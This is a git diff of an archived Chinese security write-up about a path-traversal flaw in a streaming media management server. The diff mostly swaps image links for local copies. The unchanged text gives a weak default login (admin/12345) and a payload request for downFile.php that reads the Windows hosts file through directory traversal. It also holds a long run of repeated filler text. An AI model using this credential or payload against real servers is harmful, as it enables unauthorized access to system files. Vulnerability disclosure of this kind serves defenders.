@@ -53,7 +53,7 @@ source_status: "recorded"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rNyBEJ_YWAiMaAoIlM9OjQ)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqshtnWHbye1V5UmBfpoywIiag41FpucRHN4Uyib4k5Ex6t393d2jNzXP2Q/640?wx_fmt=png)
+![](../../.resource/remote/fc9a3a9800c10ac68300e339417a29222c0c52b3c0c89613540a99423c151d2a.png)
 
 **0x01 漏洞描述**  
 
@@ -72,20 +72,20 @@ title="流媒体管理服务器"
 
 弱口令：admin - 12345  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsgcksZddicn8X9X3icH3T1nQOkA4PuZk8oicXg3Wzeaypzql45FY4ibDk3g/640?wx_fmt=png)
+![](../../.resource/remote/91a466d18b2d30b530435ccf5fe7af07c226c194e328cb271fbb560c050e1fa5.png)
 
 < 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 ><凑字数>< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsQPZNYfLFvfrbj8Kg2ZXGHpmJBia8K2icC8b0xSzibVJOXMVJgpQN8ZUYQ/640?wx_fmt=png)
+![](../../.resource/remote/150f1de215b3cc7f180da8a44298a0e8dab5311451d36047a8d64ab124f5c9fc.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsUfl9XCjHwVfyXFKQ842wujPvSyeBgkhicGll56Kul8rbIaXpZ568LwQ/640?wx_fmt=png)
+![](../../.resource/remote/06d4cce7c5711ca2b189fd3280ad6c7913622dfbe405710a50d1144ae197dea2.png)
 
 ```
 ## Payload
 /systemLog/downFile.php?fileName=../../../../../../../windows/system32/drivers/etc/hosts
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsxhhXPo4tFc0icEG5icspCge1E8bTic3xkO4IuPvbWyCQbBIyKm23PBbRw/640?wx_fmt=jpeg)
+![](../../.resource/remote/966ecde5eda710b993f90ff15d789e9766588199ed08c1d59402ea1361a18194.jpg)
 
 ---
 
